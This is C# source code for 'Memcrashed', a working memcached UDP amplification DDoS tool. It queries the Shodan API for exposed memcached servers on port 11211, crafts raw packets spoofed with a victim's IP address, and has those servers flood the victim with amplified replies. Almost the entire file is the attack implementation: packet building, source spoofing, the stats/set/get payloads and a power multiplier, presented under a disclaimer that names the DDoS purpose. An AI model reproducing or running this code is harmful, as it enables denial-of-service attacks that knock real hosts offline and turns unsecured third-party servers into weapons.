using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using SharpPcap;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Memcrashed_CSharp
{
    class Program
    {
        public static String API_KEY;
        public static String API_Path = "./api.config";
        public static String Bot_Path = "./bots.config";
        public static String Spoofing_Source_IPAddress, Soruce_port, Packet_Power, Packet_Payload;
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.WriteLine("############################ Memcrashed C# Version ############################\r\n");
            Console.WriteLine("############################ Author: HyojongKim #####################################\r\n");
            Console.WriteLine("############################ Version: 1.0 #####################################\r\n");
            Console.WriteLine();
            Console.WriteLine("####################################### DISCLAIMER ########################################");
            Console.WriteLine("| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |");
            Console.WriteLine("| memcached servers. It then allows you to use the same servers to launch widespread      |");
            Console.WriteLine("| distributed denial of service attacks by forging UDP packets sourced to your victim.    |");
            Console.WriteLine("| Default payload includes the memcached \"stats\" command, 10 bytes to send, but the reply |");
            Console.WriteLine("| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |");
            Console.WriteLine("| I am NOT responsible for any damages caused or any crimes committed by using this tool. |");
            Console.WriteLine("###########################################################################################");
            Console.WriteLine();

            Console.WriteLine("");
            var devices = CaptureDeviceList.Instance;
            int ii = 0;
            foreach (var dev in devices)
            {
                Console.WriteLine("{0}) {1} {2}", ii, dev.Name, dev.Description);
                ii++;
            }
            Console.WriteLine();
            Console.Write("[*] Please choose a device to capture: ");
            ii = int.Parse(Console.ReadLine());

            var device = devices[ii];
            int readTimeoutMilliseconds = 1000;
            device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);

            if (File.Exists(API_Path))
            {
                using (System.IO.StreamReader sr = new System.IO.StreamReader(API_Path))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        API_KEY = line;
                    }
                }
            }
            else
            {
                Console.Write("[*] Please enter a valid Shodan.io API Key: ");
                API_KEY = Console.ReadLine();
                StreamWriter sw = new StreamWriter(API_Path, false);
                sw.WriteLine(API_KEY);
                sw.Close();
                Console.WriteLine("[~] File written: " + API_Path);
            }
            Console.WriteLine();
            Console.Write("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ");
            var tmp = Console.ReadLine().ToLower();
            if (tmp.Equals("y"))
            {
                Console.WriteLine();
                Console.WriteLine("[~] Checking Shodan.io API Key: {0}", API_KEY);

                var result = crawler("https://api.shodan.io/shodan/host/search?key=" + API_KEY + "&query=product:Memcached&facets=%22port:11211%22&page=1");

                if (ValidateJSON(result))
                {
                    int Bot_Group = 0;
                    while (true)
                    {
                        Console.WriteLine("[√] API Key Authentication: SUCCESS");
                        Newtonsoft.Json.Linq.JObject jObject = Newtonsoft.Json.Linq.JObject.Parse(result);
                        JToken Matches_Token = jObject["matches"];
                        JToken Total_Token = jObject["total"];

                        int IP_Address_Count = WordCount(jObject.ToString(), "ip_str");
                        int Total_Page = (Convert.ToInt32(Total_Token.ToString()) / IP_Address_Count) + 1;
                        Console.WriteLine("[~] Number of bots: {0}", Total_Token.ToString());
                        Console.WriteLine("[~] Warring : One group is 100 bots.");
                        Console.WriteLine();
                        Console.Write("[*] Please select a bot group to use < range 1 ~" + Total_Page.ToString() + " >: ");

                        Bot_Group = int.Parse(Console.ReadLine());

                        Console.WriteLine();
                        Console.WriteLine("[*] Number of bots selected : {0}", (Bot_Group * 100).ToString());

                        if (Bot_Group <= Total_Page)
                        {
                            if (Bot_Group == 0)
                            {
                                Console.Clear();
                                continue;
                            }
                            break;
                        }
                        else
                        {
                            Console.Clear();
                        }
                    }

                    string[] IP_Address_List = IP_Address_Parsing(Bot_Group);
                    ArrayList IP_Address_ArrayList = new ArrayList();
                    Console.WriteLine();
                    Console.Write("[*] Save results for later usage? <Y/n>: ");
                    tmp = Console.ReadLine().ToLower();
                    if (tmp.Equals("y"))
                    {
                        StreamWriter sw = new StreamWriter(Bot_Path, false);
                        for (int k = 0; k < IP_Address_List.Length; k++)
                        {
                            sw.WriteLine(IP_Address_List[k]);
                        }
                        sw.Close();
                        Console.WriteLine("[~] File written: " + Bot_Path);
                        Console.WriteLine();
                    }
                    // 

                    Console.Write("[*] Would you like to use locally stored Shodan data? <Y/n>: ");
                    tmp = Console.ReadLine().ToLower();


                    if (tmp.Equals("y")) //로컬에서 불러오기
                    {
                        if (File.Exists(Bot_Path))
                        {
                            System.Array.Clear(IP_Address_List, 0, IP_Address_List.Length); //초기화
                            using (System.IO.StreamReader sr = new System.IO.StreamReader(Bot_Path, true))
                            {
                                string line;
                                while ((line = sr.ReadLine()) != null)
                                {
                                    IP_Address_ArrayList.Add(line);
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[×] Error: No bots stored locally, " + Bot_Path + " file not found!");
                            for (int i = 0; i < IP_Address_List.Length; i++)
                            {
                                IP_Address_ArrayList.Add(IP_Address_List[i].ToString());
                            }
                        }
                    }
                    else
                    { //온라인에서 불러온 내용을 동적메모리에 저장
                        for (int i = 0; i < IP_Address_List.Length; i++)
                        {
                            IP_Address_ArrayList.Add(IP_Address_List[i].ToString());
                        }
                    }

                    Console.Write("[*] Enter target IP address: ");
                    Spoofing_Source_IPAddress = Console.ReadLine();
                    Console.Write("[*] Enter target port nu~mber (Default 80): ");
                    Soruce_port = Console.ReadLine();
                    Console.Write("[*] Enter preferred power (Default 1): ");
                    Packet_Power = Console.ReadLine();
                    Console.Write("[+] Enter payload contained inside packet: ");
                    Packet_Payload = Console.ReadLine();

                    Console.Write("[*] Would you like to display all the bots from List? <Y/n>: ");
                    tmp = Console.ReadLine().ToLower();
                    if (tmp.Equals("y"))
                    {
                        Console.WriteLine();
                        Console.WriteLine("It takes about " + Bot_Group * 500 + " seconds.");
                        Console.WriteLine();

                        for (int i = 0; i < IP_Address_ArrayList.Count; i++)
                        {
                            try
                            {
                                result = crawler("https://api.shodan.io/shodan/host/" + IP_Address_ArrayList[i].ToString() + "?key=" + API_KEY);
                                JObject jo = JObject.Parse(result.ToString());
                                String isp = jo["isp"].ToString();
                                String os = jo["os"].ToString();
                                if (os.Equals("")) { os = "n/a"; }
                                Console.WriteLine("[+] Memcache Server ({0}) | IP: {1} | OS: {2} | ISP: {3} |", i, IP_Address_ArrayList[i].ToString(), os, isp);
                                Thread.Sleep(500);
                            }
                            catch (JsonReaderException)
                            {
                                Console.WriteLine("[~] Memcache Server Information {0} Fail!", IP_Address_ArrayList[i].ToString());
                                continue;
                            }
                        }
                    }
                    Console.WriteLine();
                    Console.Write("[*] Ready to engage target {0}? <Y/n>: ", Spoofing_Source_IPAddress);
                    tmp = Console.ReadLine().ToLower();
                    if (tmp.Equals("y"))
                    {
                        for (int i = 0; i < IP_Address_ArrayList.Count; i++)
                        {
                            if (Packet_Payload.Length != 0)
                            {
                                Console.WriteLine("[+] Sending 2 forged synchronized payloads to: {0}", i.ToString());
                                Budding_Packet(device, Spoofing_Source_IPAddress, Soruce_port, IP_Address_ArrayList[i].ToString(), "11211", "injected", 1);
                                for (int k = 0; k < Convert.ToInt32(Packet_Power); k++)
                                {
                                    Budding_Packet(device, Spoofing_Source_IPAddress, Soruce_port, IP_Address_ArrayList[i].ToString(), "11211", "injected", 2);
                                }

                            }
                            else
                            {
                                if (Convert.ToInt32(Packet_Power) > 1)
                                {
                                    for (int k = 0; k < Convert.ToInt32(Packet_Power); k++)
                                    {
                                        Console.WriteLine("[+] Sending {0} forged UDP packets to: {1}", Packet_Power, k);
                                        Budding_Packet(device, Spoofing_Source_IPAddress, Soruce_port, IP_Address_ArrayList[i].ToString(), "11211", "stats", 3);
                                    }
                                }
                                else if (Convert.ToInt32(Packet_Power) == 1)
                                {
                                    Console.WriteLine("[+] Sending 1 forged UDP packet to: {0}", i.ToString());
                                    for (int k = 0; k < Convert.ToInt32(Packet_Power); k++)
                                    {
                                        Budding_Packet(device, Spoofing_Source_IPAddress, Soruce_port, IP_Address_ArrayList[i].ToString(), "11211", "stats", 3);
                                    }
                                }
                            }
                        }

                        Console.WriteLine("[√] Task complete! Exiting Platform. Have a wonderful day.");
                    }

                }
            }
        }

        public static String Get_GatewayAddress()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .Where(a => a != null)
                .FirstOrDefault().ToString();
        }

        public static void Budding_Packet(ICaptureDevice device, String Source_IP, String Source_Port, String Dst_IP, String Dst_Port, String str, int type)
        {
            var ethernetPacket = new PacketDotNet.EthernetPacket(PhysicalAddress.Parse(Get_LocalMacAddress(Get_LocalIP()).ToUpper()), PhysicalAddress.Parse(Get_Gateway_MacAddress(Get_GatewayAddress()).ToUpper()), PacketDotNet.EthernetType.IPv4);
            var ipv4 = new PacketDotNet.IPv4Packet(IPAddress.Parse(Source_IP), IPAddress.Parse(Dst_IP));
            var udp = new PacketDotNet.UdpPacket(Convert.ToUInt16(Source_Port), Convert.ToUInt16(Dst_Port));

            switch (type)
            {
                case 1:
                    udp.PayloadData = set_injection(str);
                    break;
                case 2:
                    udp.PayloadData = get_injection(str);
                    break;
                case 3:
                    udp.PayloadData = status_packet(str);
                    break;
                default:
                    break;
            }

            ipv4.Id = 1;
            ipv4.TimeToLive = 64;
            ipv4.PayloadPacket = udp;
            ipv4.Checksum = ipv4.CalculateIPChecksum();
            udp.Checksum = udp.CalculateUdpChecksum();
            ethernetPacket.PayloadPacket = ipv4;

            device.SendPacket(ethernetPacket);
        }
        public static string Get_LocalIP()
        {
            string strHostName = "";
            strHostName = System.Net.Dns.GetHostName();
            IPHostEntry ipEntry = System.Net.Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;
            return addr[addr.Length - 1].ToString();
        }

        public static string Get_Gateway_MacAddress(string ipAddress)
        {
            string macAddress = string.Empty;
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            pProcess.StartInfo.FileName = "arp";
            pProcess.StartInfo.Arguments = "-a " + ipAddress;
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = true;
            pProcess.StartInfo.CreateNoWindow = true;
            pProcess.Start();
            string strOutput = pProcess.StandardOutput.ReadToEnd();
            string[] substrings = strOutput.Split('-');
            if (substrings.Length >= 8){
                macAddress = substrings[3].Substring(Math.Max(0, substrings[3].Length - 2))
                         + "-" + substrings[4] + "-" + substrings[5] + "-" + substrings[6]
                         + "-" + substrings[7] + "-"
                         + substrings[8].Substring(0, 2);
                return macAddress;
            }else{
                return "not found";
            }
        }

        public static string Get_LocalMacAddress(string ip)
        {
            string rtn = string.Empty;
            ObjectQuery oq = new System.Management.ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE'");
            ManagementObjectSearcher query1 = new ManagementObjectSearcher(oq);
            foreach (ManagementObject mo in query1.Get())
            {
                string[] address = (string[])mo["IPAddress"];
                if (address[0] == ip && mo["MACAddress"] != null)
                {
                    rtn = mo["MACAddress"].ToString();
                    break;
                }
            }
            return rtn.Replace(":", "-").ToString();
        }

        public static byte[] status_packet(String str)
        {
            var Array = new List<byte>();
            for (int k = 0; k < 5; k++)
            {
                Array.Add(0);
            }
            Array.Add(1);
            for (int k = 0; k < 2; k++)
            {
                Array.Add(0);
            }
            String tmp = str + "\r\n";
            char[] LowArray = tmp.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            byte[] ArrayByte = Array.ToArray();
            return ArrayByte;
        }

        public static byte[] get_injection(String str)
        {
            var Array = new List<byte>();
            for (int k = 0; k < 8; k++)
            {
                Array.Add(0);
            }
            String str1 = "get";
            char[] LowArray = str1.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            Array.Add(0);

            String str2 = str;
            LowArray = str2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            String tmp2 = "\r\n";
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            byte[] ArrayByte = Array.ToArray();
            return ArrayByte;
        }

        public static byte[] set_injection(String str)
        {
            var Array = new List<byte>();
            for (int k = 0; k < 8; k++)
            {
                Array.Add(0);
            }
            String str1 = "set";
            char[] LowArray = str1.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            Array.Add(0);

            String str2 = str;
            LowArray = str2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);
            Array.Add(0);

            String tmp2 = "0";
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            Array.Add(0);

            tmp2 = "3600";
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            Array.Add(0);


            tmp2 = (Packet_Payload.Length + 1).ToString();
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            tmp2 = "\r\n";
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            tmp2 = Packet_Payload;
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < Packet_Payload.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            tmp2 = "\r\n";
            LowArray = tmp2.ToCharArray();
            for (int i = 0; i < LowArray.Length; i++)
            {
                Array.Add(Convert.ToByte(LowArray[i]));
            }
            System.Array.Clear(LowArray, 0, LowArray.Length);

            byte[] ArrayByte = Array.ToArray();
            return ArrayByte;
        }


        public static String[] IP_Address_Parsing(int Count)
        {
            int x = 0;
            ArrayList IP_Address_List = new ArrayList();

            for (int a = 1; a <= Count; a++)
            {
                try
                {
                    var result = crawler("https://api.shodan.io/shodan/host/search?key=" + API_KEY + "&query=product:Memcached&facets=%22port:11211%22&page=" + a.ToString());
                    JObject jObject = Newtonsoft.Json.Linq.JObject.Parse(result);
                    JToken Matches_Token = jObject["matches"];
                    int ip_count = WordCount(jObject.ToString(), "ip_str");
                    Console.Write(a.ToString());
                    for (int ii = 0; ii < ip_count; ii++)
                    {
                        IP_Address_List.Add((string)Matches_Token[ii]["ip_str"]);
                        Console.Write(".");
                        //Console.WriteLine("Currently {0} of {1}.", x, (Count * 100).ToString());
                        x++;
                    }
                    Console.Write("ok");
                    Console.WriteLine();
                }
                catch (JsonReaderException)
                {
                    continue;
                }
                Thread.Sleep(5000);
            }
            Console.Clear();
            return (string[])IP_Address_List.ToArray(typeof(string));
        }
        public static int WordCount(string String, string Word)
        {
            string[] StringArray = String.Split(new string[] { Word }, StringSplitOptions.None);
            return StringArray.Length - 1;
        }
        public static bool ValidateJSON(string s)
        {
            try
            {
                JToken.Parse(s);
                return true;
            }
            catch (JsonReaderException)
            {
                return false;
            }
        }
        public static String crawler(string url)
        {
            string responseText = string.Empty;
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Timeout = 30 * 1000; // 30초

                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    HttpStatusCode status = resp.StatusCode;

                    Stream respStream = resp.GetResponseStream();
                    using (StreamReader sr = new StreamReader(respStream))
                    {
                        responseText = sr.ReadToEnd();
                    }
                }
                return responseText;
            }
            catch (WebException w)
            {
                int wRespStatusCode = (int)((HttpWebResponse)w.Response).StatusCode;
                switch (wRespStatusCode)
                {
                    case 401:
                        responseText = "API Key 실패";
                        break;
                    case 500:
                        responseText = "Server Error 500";
                        break;
                    default:
                        responseText = wRespStatusCode.ToString();
                        break;
                }

                return responseText;
            }

        }
    }
}
